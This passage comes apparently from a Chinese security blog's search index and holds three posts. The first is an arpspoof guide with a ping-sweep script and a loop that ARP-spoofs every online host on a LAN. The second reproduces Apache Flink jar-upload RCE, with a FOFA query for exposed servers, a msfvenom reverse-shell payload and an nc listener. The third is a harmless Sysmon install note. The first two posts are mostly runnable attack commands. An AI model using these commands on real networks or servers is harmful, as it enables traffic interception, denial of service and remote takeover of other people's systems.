<p>报错解决：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">缺少scapy</span><br><span class="line"></span><br><span class="line">安装pip，wget https://bootstrap.pypa.io/对应的pip版本号</span><br><span class="line"></span><br><span class="line">执行：pip install scapy</span><br><span class="line"></span><br><span class="line">再次安装：</span><br><span class="line"></span><br><span class="line">执行：python setup.py install</span><br></pre></td></tr></table></figure>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>1.对单一IP进行攻击测试;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arpspoof -i ens33 -t 192.168.100.10 192.168.100.1</span><br><span class="line">-i	物理网卡名称</span><br><span class="line">-t	目标IP地址</span><br><span class="line">	最后跟目标主机的网关IP地址</span><br></pre></td></tr></table></figure>

<p>2.对局域网全部机器进行攻击;</p>
<ul>
<li>编写一个脚本，获取局域网所有在线IP</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#此内容编辑保存成sh文件;并赋予执行权限(chmod 777 xx)</span><br><span class="line">#!/bin/bash</span><br><span class="line">#获取IP&amp;#xff0c;并将在线的IP写入up.txt的文件中</span><br><span class="line">&gt; /root/up.txt</span><br><span class="line">for i in `seq 255`;</span><br><span class="line">do      &#123;</span><br><span class="line">        M_ip=192.168.100.$i</span><br><span class="line">        ping -c1 -W1 $M_ip &amp;&gt;/dev/null</span><br><span class="line">        if [ $? -eq 0 ]</span><br><span class="line">        then</span><br><span class="line">                echo &quot;$M_ip&quot; &gt;&gt; /root/up.txt</span><br><span class="line">        fi</span><br><span class="line">        &#125;&amp;</span><br><span class="line">done</span><br><span class="line">wait</span><br><span class="line">echo &quot;获取完成&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>运行第一个脚本后，运行第二个脚本实施攻击测试</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#注意-i后边的网卡名字以及结尾的网关IP不要写错</span><br><span class="line">#!/bin/bash</span><br><span class="line">#进行arp群体攻击,目标来自于文件,如果想让自己上网,就把自己的IP从文件中去掉</span><br><span class="line">while read list</span><br><span class="line">do</span><br><span class="line">    &#123;</span><br><span class="line">arpspoof -i ens33 -t $list 192.168.100.1</span><br><span class="line">&#125;&amp;</span><br><span class="line">done &lt; /root/up.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>赋予脚本执行权限，运行脚本</li>
<li>注意脚本文件里的变量，需根据自身网络环境进行修改</li>
</ul>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
  </entry>
  <entry>
    <title>Apache Flink任意Jar包上传RCE</title>
    <url>/2021/10/29/Apache%20Flink%E4%BB%BB%E6%84%8FJar%E5%8C%85%E4%B8%8A%E4%BC%A0RCE/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<p>Apache Flink是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。</p>
<p>有安全研究员公开了一个Apache Flink的任意Jar包上传导致远程代码执行的漏洞。攻击者只需要自己定制一个恶意jar上传，即可达到攻击目的。</p>
<hr>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<p>Apache Flink &lt;= 1.9.1(最新版本)</p>
<hr>
<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOFA 语句</span><br><span class="line">app=&quot;Apache-Flink&quot; &amp;&amp; country=&quot;CN&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809093851114.png" alt="image-20210809093851114"></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>镜像下载地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.apache.org/dyn/closer.lua/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz</span><br></pre></td></tr></table></figure>

<p>下载好后进入bin文件夹。执行chmod +x *，再执行./start-cluster.sh</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094032637.png" alt="image-20210809094032637"></p>
<p>访问<a href="http://ip:8081可看到环境页面：">http://ip:8081可看到环境页面：</a></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094302926.png" alt="image-20210809094302926"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.在kali中使用msfvenom生成jar包；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/shell_reverse_tcp LHOST=192.168.40.132 LPORT=4444 -f jar &gt;msfshell.jar</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094432691.png" alt="image-20210809094432691"></p>
<p>2.在kali中使用nc监听6666端口；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094515194.png" alt="image-20210809094515194"></p>
<p>3.上传生成的jar包</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094615504.png" alt="image-20210809094615504"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094644864.png" alt="image-20210809094644864"></p>
<p>点击Submit后，成功反弹shell；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094735187.png" alt="image-20210809094735187"></p>
<p>获取到的shell非正常交互界面，可执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210809094810139.png" alt="image-20210809094810139"></p>
]]></content>
      <categories>
        <category>WEB-RCE</category>
      </categories>
  </entry>
  <entry>
    <title>Sysmon安装与使用</title>
    <url>/2021/10/29/Sysmon%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
<p>系统监视器（Sysmon）是Windows系统服务和设备驱动程序。应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SHA256 或 IMPHASH 记录进程镜像文件的 hash 值，包含进程创建过程中的进程 GUID，每个事件中包含 session 的 GUID。除此之外记录磁盘和卷的读取请求 / 网络连接（包括每个连接的源进程，IP 地址，端口号，主机名和端口名），重要的是还可在生成初期进程事件能记录在复杂的内核模式运行的恶意软件。</p>
<hr>
<span id="more"></span>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载sysmon;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon</span><br></pre></td></tr></table></figure>

<p>在sysmon目录下新启cmd并执行；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysmon64.exe -i </span><br></pre></td></tr></table></figure>

<p><img src="D:\long\BOOK\主机安全研究\sysmon使用\sysmon安装与使用.assets\image-20210820095543545.png" alt="image-20210820095543545"></p>
<p>​    打开sysmon事件查看：「事件查看器」——「应用程序和服务日志」——「Microsoft」——「Windows」——「Sysmon」文件夹，其中记录了 Sysmon 写入到 Event Log 中的所有事件</p>
<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysmon -u</span><br></pre></td></tr></table></figure>

<h2 id="过滤器标签"><a href="#过滤器标签" class="headerlink" title="过滤器标签"></a>过滤器标签</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ProcessCreate            进程创建</span><br><span class="line">FileCreateTime           文件创建时间更改</span><br><span class="line">NetworkConnect           检测到网络连接</span><br><span class="line">ProcessTerminate         进程终止</span><br><span class="line">DriverLoad               驱动程序已加载</span><br><span class="line">ImageLoad                镜像加载</span><br><span class="line">CreateRemoteThread       已检测到创建远程线程</span><br><span class="line">RawAccessRead            检测到原始访问读取</span><br><span class="line">ProcessAccess            已访问的进程</span><br><span class="line">FileCreate               文件创建</span><br><span class="line">RegistryEvent            添加或删除注册表对象</span><br><span class="line">RegistryEvent            注册表值设置</span><br><span class="line">RegistryEvent            注册表对象已重命名</span><br><span class="line">FileCreateStreamHash     已创建文件流</span><br><span class="line">PipeEvent                管道创建</span><br><span class="line">PipeEvent                管道已连接</span><br><span class="line">WmiEvent                 检测到WmiEventFilter活动 -- WmiEventFilter activity detected</span><br><span class="line">WmiEvent                 检测到WmiEventConsumer活动 -- WmiEventConsumer activity detected</span><br><span class="line">WmiEvent                 检测到WmiEventConsumerToFilter活动 -- WmiEventConsumerToFilter activity </span><br><span class="line">DnsQuery                 DNS查询</span><br></pre></td></tr></table></figure>

<h2 id="事件ID"><a href="#事件ID" class="headerlink" title="事件ID"></a>事件ID</h2><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/A73038E4-A59D-47bf-9099-4787C7AF18B4.png" alt="A73038E4-A59D-47bf-9099-4787C7AF18B4"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/2.png" alt="2"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/34.png" alt="34"></p>
]]></content>
      <categories>
        <category>主机安全</category>
      </categories>
  </entry>
</search>
